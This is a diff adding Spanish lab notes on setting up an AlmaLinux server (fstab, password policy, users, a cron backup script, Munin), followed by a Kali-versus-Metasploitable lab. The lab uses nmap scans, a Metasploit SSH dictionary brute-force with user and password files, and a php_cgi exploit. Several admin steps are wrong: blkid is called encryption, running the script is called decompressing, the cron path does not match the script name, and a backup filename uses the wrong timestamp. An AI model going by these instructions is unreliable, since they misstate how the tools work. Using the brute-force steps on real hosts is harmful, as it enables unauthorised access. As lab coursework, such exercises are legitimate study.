@@ -1,0 +1,125 @@
+1.- Configuramos el alma linux
+2.- Y daremos a pulse aqui para crearlas automaticamente
+3.-
+	/home 1gb ext4
+	/var 4gb ext4	
+	/swap 1gb -defecto
+	/bios-boot 2mb ext4
+4.- Configuramos el nombre del equipo
+5.- La contraseña del equipo
+6.- Instalamos
+7.- Ahora aseguraremos los archivos mediante fstab
+	- Ingresamos a tab nano /etc/fstab
+	- Copiaremos la primera ruta /dev/mapper/almalinux-root e ingresaremos el siguiente 	comando para encriptar el directorio blkid /dev/mapper/almalinux-root
+	- Ahora copiaremos el UUID y lo cambiaremos por la ruta del directorio
+	- Haremos los mismo para todos los otros directorios
+
+8.- Ahora pediremos cambio de contraseña iremos casi al final del archivo y pondremos lo siguiente
+	PASS_MAX_DAYS   60
+	PASS_MIN_DAYS   0
+	PASS_WARN_AGE   7
+	PASS_MIN_LEN    5
+
+9.- Ahora crearemos los usuarios y sus contraseñas
+
+	-para agregar un usuario pondremos lo siguiente adduser usufisei1
+	-para agregar la contraseña pondremos lo siguiente passwd usufisei1
+	-probaremos el ingreso de cada uno de los usuarios
+	- Ahora daremos permisos de administrador usermod -aG wheel usufisei1
+	-Veremos si se han asignado los permisos de usuario correspondientes
+
+10.- Ahora escribiremos un script para generar respaldos de manera automatizada los lunes a las 6AM 
+	-Instalamos tar
+	-Crearemos un archivo llamado backup.sh y dentro pondremos lo siguiente
+	#!/bin/bash
+	FECHA_Y_HORA_ETC=`date "+%d-%m-%y_%H-%M-%S"`
+	NOMBRE_ARCHIVO_ETC="respaldo_ETC_$FECHA_Y_HORA_ETC.tgz"
+	CARPETA_DESTINO="RespaldosSeguridad"
+	CARPETA_RESPALDO_ETC="../etc"
+	#Directorio para respaldos
+	mkdir -p "$CARPETA_DESTINO"
+	tar cfvz "$CARPETA_DESTINO/$NOMBRE_ARCHIVO_ETC" "$CARPETA_RESPALDO_ETC"
+
+	FECHA_Y_HORA_VAR=`date "+%d-%m-%y_%H-%M-%S"`
+	NOMBRE_ARCHIVO_VAR="respaldo_VAR_$FECHA_Y_HORA_ETC.tgz"
+	CARPETA_DESTINO="RespaldosSeguridad"
+	CARPETA_RESPALDO_VAR="../var"
+	#Directorio para respaldos
+	mkdir -p "$CARPETA_DESTINO"
+	tar cfvz "$CARPETA_DESTINO/$NOMBRE_ARCHIVO_VAR" "$CARPETA_RESPALDO_VAR"
+
+	FECHA_Y_HORA_HOME=`date "+%d-%m-%y_%H-%M-%S"`
+	NOMBRE_ARCHIVO_HOME="respaldo_HOME_$FECHA_Y_HORA_HOME.tgz"
+	CARPETA_DESTINO="RespaldosSeguridad"
+	CARPETA_RESPALDO_HOME="../home"
+	#Directorio para respaldos
+	mkdir -p "$CARPETA_DESTINO"
+	tar cfvz "$CARPETA_DESTINO/$NOMBRE_ARCHIVO_HOME" "$CARPETA_RESPALDO_HOME"
+
+	-y daremos los permisos al backup chmod 755 backup.sh
+	-Ahora descomprimiremos el archivo ./backup.sh
+	-Ahora insertamos lo siguiente para cuando editemos el tiempo EDIT=nano crontab -e
+	0 6 * * 1 /bin/bash /root/backup
+
+11.- Evidenciaremos las graficas del Munin
+	-Instalaremos el apache lo activaremos y habilitaremos los puertos
+	-Instalaremos el epel-release 
+	-Instalaremos el munin munin-node --skip-broken
+	-Verificamos is el munin esta instalado cd /etc/munin
+	-Ahora pondremos lo siguiente en la siguiente carpeta nano munin-node.conf
+		al final del archivo
+		log_level 4
+		log_file /var/log/munin-node/munin-node.log
+		pid_file /var/run/munin/munin-node.pid
+		dbdir /var/lib/munin
+		htmldir /var/www/html/munin
+		logdir /var/log/munin
+		rundir /var/munin
+	-Instalaremos el perl
+	-Ahora lo activaremos dnf config-manager --enable crb
+	-Instalaremos el munin munin-node
+	-systemctl start munin-node
+	-systemctl enable munin-node 
+	-systemctl start munin
+	-systemctl enable munin
+
+Seguridad
+
+1.- Añadiremos el kali linux
+2.- Añadiremos el metasplotable
+3.- Ahora en kali identificaremos los host conectados en nuestra red
+	-Con nmap -sP 192.168.100.0/24 
+4.- Ahora identificaremos los puertos de red abiertos de una red en especifico
+	-Con nmap -sT 192.168.100.5
+5.- Ahora para explotar alguna vulnerabilidad usaremos el metasploit framework
+SSH
+	-Dentro pondremos search ssh o el tipo de vulnerabilidad que queremos explotar
+	-Una vez hecho esto ahora usaremos alguna de todas las opciones con el siguiente comando
+	use auxiliary/scanner/ssh/ssh_login
+	-Ahora con el comando info veremos que se necesita para explotar la vulnerabilidad
+	-Ahora nos descargaremos los diccionarios de github
+	-Ahora para ssh configuraremos el host al que queremos atacar
+	set RHOSTS 192.168.100.5  
+	-Configuraremos el usuario y la contraseña del metasplotable en los diccionarios
+	-Pondremos lo siguiente para los usuarios set USER_FILE /home/kali/Desktop/usuarios.txt
+	-Pondremos lo siguiente para las contraseñas set PASS_FILE /home/kali/Desktop/claves.txt
+	-Pondremos lo siguiente para visualizar el ataque set VERBOSE true
+	-Pondremos exploit para empezar el ataque
+	-Pondremos sessions -l para ver las sesiones guardadas
+	-Ahora iniciaremos la sesion
+HTTP
+	-Ahora para explotar el puerto HTTP 80 veremos que servidor esta usando con lo siguiente
+	nmap -sV 192.168.100.63 -p 80
+	-En metaexploit buscaremos algo para explotar el php
+ 	search php_cgi
+	-use 0
+	- set RHOSTS 
+	- exploit
+	
+
+	
+
+
+
+
+
